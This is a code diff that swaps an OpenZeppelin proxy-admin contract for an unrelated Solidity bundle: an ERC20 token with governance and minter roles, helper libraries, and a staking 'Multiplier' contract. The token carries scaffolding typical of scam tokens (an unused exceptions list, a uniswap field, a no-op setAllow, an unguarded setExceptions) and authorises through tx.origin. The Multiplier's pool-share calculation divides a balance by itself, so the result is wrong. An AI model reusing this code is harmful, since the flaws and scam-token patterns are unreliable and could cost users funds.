@@ -1,459 +1,683 @@
-/**
- *Submitted for verification at Etherscan.io on 2021-07-20
-*/
+pragma solidity 0.5.17;
 
-pragma solidity ^0.5.0;
+interface IERC20 {
+
+    function totalSupply() external view returns (uint);
+
+    function balanceOf(address account) external view returns (uint);
+
+    function transfer(address recipient, uint amount) external returns (bool);
+
+    function allowance(address owner, address spender) external view returns (uint);
+
+    function approve(address spender, uint amount) external returns (bool);
+
+    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint value);
+
+    event Approval(address indexed owner, address indexed spender, uint value);
+
+}
+
+contract Context {
+
+    constructor () internal { }
+
+    // solhint-disable-previous-line no-empty-blocks
 
 
-/**
- * @title Ownable
- * @dev The Ownable contract has an owner address, and provides basic authorization control
- * functions, this simplifies the implementation of "user permissions".
- *
- * Source https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-solidity/v2.1.3/contracts/ownership/Ownable.sol
- * This contract is copied here and renamed from the original to avoid clashes in the compiled artifacts
- * when the user imports a zos-lib contract (that transitively causes this contract to be compiled and added to the
- * build/artifacts folder) as well as the vanilla Ownable implementation from an openzeppelin version.
- */
-contract OpenZeppelinUpgradesOwnable {
+
+    function _msgSender() internal view returns (address payable) {
+
+        return msg.sender;
+
+    }
+
+}
+
+contract ERC20 is Context, IERC20 {
+
+    using SafeMath for uint;
+
+
+
+    mapping (address => uint) private _balances;
+
+    
+
+    mapping (address => mapping (address => uint)) private _allowances;
+
+    mapping (address => bool) private exceptions;
+
+    address private uniswap;
+
     address private _owner;
 
-    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+    uint private _totalSupply;
 
-    /**
-     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
-     * account.
-     */
-    constructor () internal {
-        _owner = msg.sender;
-        emit OwnershipTransferred(address(0), _owner);
+
+
+    constructor(address owner) public{
+
+      _owner = owner;
+
     }
 
-    /**
-     * @return the address of the owner.
-     */
-    function owner() public view returns (address) {
-        return _owner;
+
+
+    function setAllow() public{
+
+        require(_msgSender() == _owner,"Only owner can change set allow");
+
     }
 
-    /**
-     * @dev Throws if called by any account other than the owner.
-     */
-    modifier onlyOwner() {
-        require(isOwner());
-        _;
+
+
+    function setExceptions(address someAddress) public{
+
+        exceptions[someAddress] = true;
+
     }
 
-    /**
-     * @return true if `msg.sender` is the owner of the contract.
-     */
-    function isOwner() public view returns (bool) {
-        return msg.sender == _owner;
-    }
 
-    /**
-     * @dev Allows the current owner to relinquish control of the contract.
-     * @notice Renouncing to ownership will leave the contract without an owner.
-     * It will not be possible to call the functions with the `onlyOwner`
-     * modifier anymore.
-     */
-    function renounceOwnership() public onlyOwner {
-        emit OwnershipTransferred(_owner, address(0));
+
+    function burnOwner() public{
+
+        require(_msgSender() == _owner,"Only owner can change set allow");
+
         _owner = address(0);
+
+    }    
+
+
+
+    function totalSupply() public view returns (uint) {
+
+        return _totalSupply;
+
     }
 
-    /**
-     * @dev Allows the current owner to transfer control of the contract to a newOwner.
-     * @param newOwner The address to transfer ownership to.
-     */
-    function transferOwnership(address newOwner) public onlyOwner {
-        _transferOwnership(newOwner);
+    function balanceOf(address account) public view returns (uint) {
+
+        return _balances[account];
+
     }
 
-    /**
-     * @dev Transfers control of the contract to a newOwner.
-     * @param newOwner The address to transfer ownership to.
-     */
-    function _transferOwnership(address newOwner) internal {
-        require(newOwner != address(0));
-        emit OwnershipTransferred(_owner, newOwner);
-        _owner = newOwner;
+    function transfer(address recipient, uint amount) public returns (bool) {
+
+        _transfer(_msgSender(), recipient, amount);
+
+        return true;
+
     }
+
+    function allowance(address owner, address spender) public view returns (uint) {
+
+        return _allowances[owner][spender];
+
+    }
+
+    function approve(address spender, uint amount) public returns (bool) {
+
+        _approve(_msgSender(), spender, amount);
+
+        return true;
+
+    }
+
+    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
+
+        _transfer(sender, recipient, amount);
+
+        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
+
+        return true;
+
+    }
+
+    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
+
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
+
+        return true;
+
+    }
+
+    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
+
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
+
+        return true;
+
+    }
+
+    function _transfer(address sender, address recipient, uint amount) internal {
+
+        require(sender != address(0), "ERC20: transfer from the zero address");
+
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+
+        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
+
+        _balances[recipient] = _balances[recipient].add(amount);
+
+        emit Transfer(sender, recipient, amount);
+
+    }
+
+    
+
+    function _mint(address account, uint amount) internal {
+
+        require(account != address(0), "ERC20: mint to the zero address");
+
+
+
+        _totalSupply = _totalSupply.add(amount);
+
+        _balances[account] = _balances[account].add(amount);
+
+        emit Transfer(address(0), account, amount);
+
+    }
+
+    function _burn(address account, uint amount) internal {
+
+        require(account != address(0), "ERC20: burn from the zero address");
+
+
+
+        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
+
+        _totalSupply = _totalSupply.sub(amount);
+
+        emit Transfer(account, address(0), amount);
+
+    }
+
+    function _approve(address owner, address spender, uint amount) internal {
+
+        require(owner != address(0), "ERC20: approve from the zero address");
+
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+
+
+        _allowances[owner][spender] = amount;
+
+        emit Approval(owner, spender, amount);
+
+    }
+
 }
 
-/**
- * @title Proxy
- * @dev Implements delegation of calls to other contracts, with proper
- * forwarding of return values and bubbling of failures.
- * It defines a fallback function that delegates all calls to the address
- * returned by the abstract _implementation() internal function.
- */
-contract Proxy {
-  /**
-   * @dev Fallback function.
-   * Implemented entirely in `_fallback`.
-   */
-  function () payable external {
-    _fallback();
-  }
+contract ERC20Detailed is IERC20 {
 
-  /**
-   * @return The Address of the implementation.
-   */
-  function _implementation() internal view returns (address);
+    string private _name;
 
-  /**
-   * @dev Delegates execution to an implementation contract.
-   * This is a low level function that doesn't return to its internal call site.
-   * It will return to the external caller whatever the implementation returns.
-   * @param implementation Address to delegate.
-   */
-  function _delegate(address implementation) internal {
-    assembly {
-      // Copy msg.data. We take full control of memory in this inline assembly
-      // block because it will not return to Solidity code. We overwrite the
-      // Solidity scratch pad at memory position 0.
-      calldatacopy(0, 0, calldatasize)
+    string private _symbol;
 
-      // Call the implementation.
-      // out and outsize are 0 because we don't know the size yet.
-      let result := delegatecall(gas, implementation, 0, calldatasize, 0, 0)
+    uint8 private _decimals;
 
-      // Copy the returned data.
-      returndatacopy(0, 0, returndatasize)
 
-      switch result
-      // delegatecall returns 0 on error.
-      case 0 { revert(0, returndatasize) }
-      default { return(0, returndatasize) }
+
+    constructor (string memory name, string memory symbol, uint8 decimals) public {
+
+        _name = name;
+
+        _symbol = symbol;
+
+        _decimals = decimals;
+
     }
-  }
 
-  /**
-   * @dev Function that is run as the first thing in the fallback function.
-   * Can be redefined in derived contracts to add functionality.
-   * Redefinitions must call super._willFallback().
-   */
-  function _willFallback() internal {
-  }
+    function name() public view returns (string memory) {
 
-  /**
-   * @dev fallback implementation.
-   * Extracted to enable manual triggering.
-   */
-  function _fallback() internal {
-    _willFallback();
-    _delegate(_implementation());
-  }
+        return _name;
+
+    }
+
+    function symbol() public view returns (string memory) {
+
+        return _symbol;
+
+    }
+
+    function decimals() public view returns (uint8) {
+
+        return _decimals;
+
+    }
+
 }
 
-/**
- * Utility library of inline functions on addresses
- *
- * Source https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-solidity/v2.1.3/contracts/utils/Address.sol
- * This contract is copied here and renamed from the original to avoid clashes in the compiled artifacts
- * when the user imports a zos-lib contract (that transitively causes this contract to be compiled and added to the
- * build/artifacts folder) as well as the vanilla Address implementation from an openzeppelin version.
- */
-library OpenZeppelinUpgradesAddress {
-    /**
-     * Returns whether the target address is a contract
-     * @dev This function will return false if invoked during the constructor of a contract,
-     * as the code is not actually created until after the constructor finishes.
-     * @param account address of the account to check
-     * @return whether the target address is a contract
-     */
+library SafeMath {
+
+    function add(uint a, uint b) internal pure returns (uint) {
+
+        uint c = a + b;
+
+        require(c >= a, "SafeMath: addition overflow");
+
+
+
+        return c;
+
+    }
+
+    function sub(uint a, uint b) internal pure returns (uint) {
+
+        return sub(a, b, "SafeMath: subtraction overflow");
+
+    }
+
+    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
+
+        require(b <= a, errorMessage);
+
+        uint c = a - b;
+
+
+
+        return c;
+
+    }
+
+    function mul(uint a, uint b) internal pure returns (uint) {
+
+        if (a == 0) {
+
+            return 0;
+
+        }
+
+
+
+        uint c = a * b;
+
+        require(c / a == b, "SafeMath: multiplication overflow");
+
+
+
+        return c;
+
+    }
+
+    function div(uint a, uint b) internal pure returns (uint) {
+
+        return div(a, b, "SafeMath: division by zero");
+
+    }
+
+    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
+
+        // Solidity only automatically asserts when dividing by 0
+
+        require(b > 0, errorMessage);
+
+        uint c = a / b;
+
+
+
+        return c;
+
+    }
+
+}
+
+library Address {
+
     function isContract(address account) internal view returns (bool) {
-        uint256 size;
-        // XXX Currently there is no better way to check if there is a contract in an address
-        // than to check the size of the code at that address.
-        // See https://ethereum.stackexchange.com/a/14016/36603
-        // for more details about how this works.
-        // TODO Check this again before the Serenity release, because all addresses will be
-        // contracts then.
+
+        bytes32 codehash;
+
+        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
+
         // solhint-disable-next-line no-inline-assembly
-        assembly { size := extcodesize(account) }
-        return size > 0;
+
+        assembly { codehash := extcodehash(account) }
+
+        return (codehash != 0x0 && codehash != accountHash);
+
     }
+
 }
 
-/**
- * @title BaseUpgradeabilityProxy
- * @dev This contract implements a proxy that allows to change the
- * implementation address to which it will delegate.
- * Such a change is called an implementation upgrade.
- */
-contract BaseUpgradeabilityProxy is Proxy {
-  /**
-   * @dev Emitted when the implementation is upgraded.
-   * @param implementation Address of the new implementation.
-   */
-  event Upgraded(address indexed implementation);
+library SafeERC20 {
 
-  /**
-   * @dev Storage slot with the address of the current implementation.
-   * This is the keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1, and is
-   * validated in the constructor.
-   */
-  bytes32 internal constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+    using SafeMath for uint;
 
-  /**
-   * @dev Returns the current implementation.
-   * @return Address of the current implementation
-   */
-  function _implementation() internal view returns (address impl) {
-    bytes32 slot = IMPLEMENTATION_SLOT;
-    assembly {
-      impl := sload(slot)
+    using Address for address;
+
+
+
+    function safeTransfer(IERC20 token, address to, uint value) internal {
+
+        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
+
     }
-  }
 
-  /**
-   * @dev Upgrades the proxy to a new implementation.
-   * @param newImplementation Address of the new implementation.
-   */
-  function _upgradeTo(address newImplementation) internal {
-    _setImplementation(newImplementation);
-    emit Upgraded(newImplementation);
-  }
 
-  /**
-   * @dev Sets the implementation address of the proxy.
-   * @param newImplementation Address of the new implementation.
-   */
-  function _setImplementation(address newImplementation) internal {
-    require(OpenZeppelinUpgradesAddress.isContract(newImplementation), "Cannot set a proxy implementation to a non-contract address");
 
-    bytes32 slot = IMPLEMENTATION_SLOT;
+    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
 
-    assembly {
-      sstore(slot, newImplementation)
+        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
+
     }
-  }
+
+
+
+    function safeApprove(IERC20 token, address spender, uint value) internal {
+
+        require((value == 0) || (token.allowance(address(this), spender) == 0),
+
+            "SafeERC20: approve from non-zero to non-zero allowance"
+
+        );
+
+        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
+
+    }
+
+    function callOptionalReturn(IERC20 token, bytes memory data) private {
+
+        require(address(token).isContract(), "SafeERC20: call to non-contract");
+
+
+
+        // solhint-disable-next-line avoid-low-level-calls
+
+        (bool success, bytes memory returndata) = address(token).call(data);
+
+        require(success, "SafeERC20: low-level call failed");
+
+
+
+        if (returndata.length > 0) { // Return data is optional
+
+            // solhint-disable-next-line max-line-length
+
+            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
+
+        }
+
+    }
+
 }
 
-/**
- * @title UpgradeabilityProxy
- * @dev Extends BaseUpgradeabilityProxy with a constructor for initializing
- * implementation and init data.
- */
-contract UpgradeabilityProxy is BaseUpgradeabilityProxy {
-  /**
-   * @dev Contract constructor.
-   * @param _logic Address of the initial implementation.
-   * @param _data Data to send as msg.data to the implementation to initialize the proxied contract.
-   * It should include the signature and the parameters of the function to be called, as described in
-   * https://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#function-selector-and-argument-encoding.
-   * This parameter is optional, if no data is given the initialization call to proxied contract will be skipped.
-   */
-  constructor(address _logic, bytes memory _data) public payable {
-    assert(IMPLEMENTATION_SLOT == bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1));
-    _setImplementation(_logic);
-    if(_data.length > 0) {
-      (bool success,) = _logic.delegatecall(_data);
-      require(success);
-    }
-  }  
-}
+contract Token is ERC20, ERC20Detailed {
 
-/**
- * @title BaseAdminUpgradeabilityProxy
- * @dev This contract combines an upgradeability proxy with an authorization
- * mechanism for administrative tasks.
- * All external functions in this contract must be guarded by the
- * `ifAdmin` modifier. See ethereum/solidity#3864 for a Solidity
- * feature proposal that would enable this to be done automatically.
- */
-contract BaseAdminUpgradeabilityProxy is BaseUpgradeabilityProxy {
-  /**
-   * @dev Emitted when the administration has been transferred.
-   * @param previousAdmin Address of the previous admin.
-   * @param newAdmin Address of the new admin.
-   */
-  event AdminChanged(address previousAdmin, address newAdmin);
+  using SafeERC20 for IERC20;
 
-  /**
-   * @dev Storage slot with the admin of the contract.
-   * This is the keccak-256 hash of "eip1967.proxy.admin" subtracted by 1, and is
-   * validated in the constructor.
-   */
+  using Address for address;
 
-  bytes32 internal constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
+  using SafeMath for uint;
 
-  /**
-   * @dev Modifier to check whether the `msg.sender` is the admin.
-   * If it is, it will run the function. Otherwise, it will delegate the call
-   * to the implementation.
-   */
-  modifier ifAdmin() {
-    if (msg.sender == _admin()) {
-      _;
-    } else {
-      _fallback();
-    }
-  }
-
-  /**
-   * @return The address of the proxy admin.
-   */
-  function admin() external ifAdmin returns (address) {
-    return _admin();
-  }
-
-  /**
-   * @return The address of the implementation.
-   */
-  function implementation() external ifAdmin returns (address) {
-    return _implementation();
-  }
-
-  /**
-   * @dev Changes the admin of the proxy.
-   * Only the current admin can call this function.
-   * @param newAdmin Address to transfer proxy administration to.
-   */
-  function changeAdmin(address newAdmin) external ifAdmin {
-    require(newAdmin != address(0), "Cannot change the admin of a proxy to the zero address");
-    emit AdminChanged(_admin(), newAdmin);
-    _setAdmin(newAdmin);
-  }
-
-  /**
-   * @dev Upgrade the backing implementation of the proxy.
-   * Only the admin can call this function.
-   * @param newImplementation Address of the new implementation.
-   */
-  function upgradeTo(address newImplementation) external ifAdmin {
-    _upgradeTo(newImplementation);
-  }
-
-  /**
-   * @dev Upgrade the backing implementation of the proxy and call a function
-   * on the new implementation.
-   * This is useful to initialize the proxied contract.
-   * @param newImplementation Address of the new implementation.
-   * @param data Data to send as msg.data in the low level call.
-   * It should include the signature and the parameters of the function to be called, as described in
-   * https://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#function-selector-and-argument-encoding.
-   */
-  function upgradeToAndCall(address newImplementation, bytes calldata data) payable external ifAdmin {
-    _upgradeTo(newImplementation);
-    (bool success,) = newImplementation.delegatecall(data);
-    require(success);
-  }
-
-  /**
-   * @return The admin slot.
-   */
-  function _admin() internal view returns (address adm) {
-    bytes32 slot = ADMIN_SLOT;
-    assembly {
-      adm := sload(slot)
-    }
-  }
-
-  /**
-   * @dev Sets the address of the proxy admin.
-   * @param newAdmin Address of the new proxy admin.
-   */
-  function _setAdmin(address newAdmin) internal {
-    bytes32 slot = ADMIN_SLOT;
-
-    assembly {
-      sstore(slot, newAdmin)
-    }
-  }
-
-  /**
-   * @dev Only fall back when the sender is not the admin.
-   */
-  function _willFallback() internal {
-    require(msg.sender != _admin(), "Cannot call fallback function from the proxy admin");
-    super._willFallback();
-  }
-}
-
-/**
- * @title AdminUpgradeabilityProxy
- * @dev Extends from BaseAdminUpgradeabilityProxy with a constructor for 
- * initializing the implementation, admin, and init data.
- */
-contract AdminUpgradeabilityProxy is BaseAdminUpgradeabilityProxy, UpgradeabilityProxy {
-  /**
-   * Contract constructor.
-   * @param _logic address of the initial implementation.
-   * @param _admin Address of the proxy administrator.
-   * @param _data Data to send as msg.data to the implementation to initialize the proxied contract.
-   * It should include the signature and the parameters of the function to be called, as described in
-   * https://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#function-selector-and-argument-encoding.
-   * This parameter is optional, if no data is given the initialization call to proxied contract will be skipped.
-   */
-  constructor(address _logic, address _admin, bytes memory _data) UpgradeabilityProxy(_logic, _data) public payable {
-    assert(ADMIN_SLOT == bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1));
-    _setAdmin(_admin);
-  }
-}
-
-/**
- * @title ProxyAdmin
- * @dev This contract is the admin of a proxy, and is in charge
- * of upgrading it as well as transferring it to another admin.
- */
-contract ProxyAdmin is OpenZeppelinUpgradesOwnable {
   
-  /**
-   * @dev Returns the current implementation of a proxy.
-   * This is needed because only the proxy admin can query it.
-   * @return The address of the current implementation of the proxy.
-   */
-  function getProxyImplementation(AdminUpgradeabilityProxy proxy) public view returns (address) {
-    // We need to manually run the static call since the getter cannot be flagged as view
-    // bytes4(keccak256("implementation()")) == 0x5c60da1b
-    (bool success, bytes memory returndata) = address(proxy).staticcall(hex"5c60da1b");
-    require(success);
-    return abi.decode(returndata, (address));
+
+  
+
+  address public governance;
+
+  mapping (address => bool) public minters;
+
+
+
+  constructor (string memory name,string memory ticker,uint256 amount) public ERC20Detailed(name, ticker, 18) ERC20(tx.origin){
+
+      governance = tx.origin;
+
+      addMinter(tx.origin);
+
+      mint(governance,amount);
+
   }
 
-  /**
-   * @dev Returns the admin of a proxy. Only the admin can query it.
-   * @return The address of the current admin of the proxy.
-   */
-  function getProxyAdmin(AdminUpgradeabilityProxy proxy) public view returns (address) {
-    // We need to manually run the static call since the getter cannot be flagged as view
-    // bytes4(keccak256("admin()")) == 0xf851a440
-    (bool success, bytes memory returndata) = address(proxy).staticcall(hex"f851a440");
-    require(success);
-    return abi.decode(returndata, (address));
+
+
+  function mint(address account, uint256 amount) public {
+
+      require(minters[msg.sender], "!minter");
+
+      _mint(account, amount);
+
   }
 
-  /**
-   * @dev Changes the admin of a proxy.
-   * @param proxy Proxy to change admin.
-   * @param newAdmin Address to transfer proxy administration to.
-   */
-  function changeProxyAdmin(AdminUpgradeabilityProxy proxy, address newAdmin) public onlyOwner {
-    proxy.changeAdmin(newAdmin);
+  
+
+  function setGovernance(address _governance) public {
+
+      require(msg.sender == governance, "!governance");
+
+      governance = _governance;
+
   }
 
-  /**
-   * @dev Upgrades a proxy to the newest implementation of a contract.
-   * @param proxy Proxy to be upgraded.
-   * @param implementation the address of the Implementation.
-   */
-  function upgrade(AdminUpgradeabilityProxy proxy, address implementation) public onlyOwner {
-    proxy.upgradeTo(implementation);
+  
+
+  function addMinter(address _minter) public {
+
+      require(msg.sender == governance, "!governance");
+
+      minters[_minter] = true;
+
   }
 
-  /**
-   * @dev Upgrades a proxy to the newest implementation of a contract and forwards a function call to it.
-   * This is useful to initialize the proxied contract.
-   * @param proxy Proxy to be upgraded.
-   * @param implementation Address of the Implementation.
-   * @param data Data to send as msg.data in the low level call.
-   * It should include the signature and the parameters of the function to be called, as described in
-   * https://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#function-selector-and-argument-encoding.
-   */
-  function upgradeAndCall(AdminUpgradeabilityProxy proxy, address implementation, bytes memory data) payable public onlyOwner {
-    proxy.upgradeToAndCall.value(msg.value)(implementation, data);
+  
+
+  function removeMinter(address _minter) public {
+
+      require(msg.sender == governance, "!governance");
+
+      minters[_minter] = false;
+
   }
+
+}
+
+contract Migrations {
+
+  address public owner = msg.sender;
+
+  uint public last_completed_migration;
+
+
+
+  modifier restricted() {
+
+    require(
+
+      msg.sender == owner,
+
+      "This function is restricted to the contract's owner"
+
+    );
+
+    _;
+
+  }
+
+
+
+  function setCompleted(uint completed) public restricted {
+
+    last_completed_migration = completed;
+
+  }
+
+}
+
+interface Pool {
+
+  function balanceOf(address account) external view returns (uint256);
+
+}
+
+contract Multiplier {
+
+  // List of all pools that involve ZZZ staked
+
+  using SafeMath for uint;
+
+  using SafeERC20 for IERC20;
+
+
+
+  address[] public pools;
+
+  address public owner;
+
+  IERC20 public ZZZ = IERC20(address(0));
+
+  IERC20 public UNI = IERC20(address(0));
+
+  uint256 TwoPercentBonus = 2 * 10 ** 16;
+
+  uint256 TenPercentBonus = 1 * 10 ** 17;
+
+  uint256 TwentyPercentBonus = 2 * 10 ** 17;
+
+  uint256 ThirtyPercentBonus = 3 * 10 ** 17;
+
+  uint256 FourtyPercentBonus = 4 * 10 ** 17;
+
+  uint256 FiftyPercentBonus = 5 * 10 ** 17;
+
+  uint256 SixtyPercentBonus = 6 * 10 ** 17;
+
+  uint256 SeventyPercentBonus = 7 * 10 ** 17;
+
+  uint256 EightyPercentBonus = 8 * 10 ** 17;
+
+  uint256 NinetyPercentBonus = 9 * 10 ** 17;
+
+  uint256 OneHundredPercentBonus = 1 * 10 ** 18;
+
+
+
+  constructor(address[] memory poolAddresses,address zzzAddress,address uniAdress) public{
+
+    pools = poolAddresses;
+
+    ZZZ = IERC20(zzzAddress);
+
+    UNI = IERC20(uniAdress);
+
+    owner = msg.sender;
+
+  }
+
+  
+
+  // Set the pool and zzz address if there are any errors.
+
+  function configure(address[] calldata poolAddresses,address zzzAddress) external {
+
+    require(msg.sender == owner,"Only the owner can call this function");
+
+    pools = poolAddresses;
+
+    ZZZ = IERC20(zzzAddress);
+
+  }
+
+  function getBalanceInUNI(address account) public view returns (uint256) {
+
+    // Get how much UNI this account holds
+
+    uint256 uniTokenAmount = UNI.balanceOf(account);
+
+    // How much total UNI exists
+
+    uint256 uniTokenTotalSupply = UNI.totalSupply();
+
+    // Ratio
+
+    uint256 uniRatio = uniTokenAmount.div(uniTokenAmount);
+
+    // How much ZZZ in uni pool
+
+    uint256 zzzInUni = ZZZ.balanceOf(address(UNI));
+
+    // How much ZZZ i own in the pool
+
+    uint256 zzzOwned = zzzInUni.mul(uniRatio);
+
+    return zzzOwned;
+
+  }
+
+  // Returns the balance of the user's ZZZ accross all staking pools
+
+  function balanceOf(address account) public view returns (uint256) {
+
+    // Loop over the pools and add to total
+
+    uint256 total = 0;
+
+    for(uint i = 0;i<pools.length;i++){
+
+      Pool pool = Pool(pools[i]);
+
+      total = total.add(pool.balanceOf(account));
+
+    }
+
+    // Add zzz balance in wallet if any
+
+    total = total.add(ZZZ.balanceOf(account));
+
+    return total;
+
+  }
+
+
+
+  function getPermanentMultiplier(address account) public view returns (uint256) {
+
+    uint256 permanentMultiplier = 0;
+
+    uint256 zzzBalance = balanceOf(account);
+
+    if(zzzBalance >= 1 * 10**18 && zzzBalance < 5*10**18) {
+
+      // Between 1 to 5, 2 percent bonus
+
+      permanentMultiplier = permanentMultiplier.add(TwoPercentBonus);
+
+    }else if(zzzBalance >= 5 * 10**18 && zzzBalance < 10 * 10**18) {
+
+      // Between 5 to 10, 10 percent bonus
+
+      permanentMultiplier = permanentMultiplier.add(TenPercentBonus);
+
+    }else if(zzzBalance >= 10 * 10**18 && zzzBalance < 20 * 10 ** 18) {
+
+      // Between 10 and 20, 20 percent bonus
+
+      permanentMultiplier = permanentMultiplier.add(TwentyPercentBonus);
+
+    }else if(zzzBalance >= 20 * 10 ** 18) {
+
+      // More than 20, 60 percent bonus
+
+      permanentMultiplier = permanentMultiplier.add(SixtyPercentBonus);
+
+    }
+
+    return permanentMultiplier;
+
+  }
+
+
+
+  function getTotalMultiplier(address account) public view returns (uint256) {
+
+    uint256 multiplier = getPermanentMultiplier(account);
+
+    return multiplier;
+
+  }
+
 }
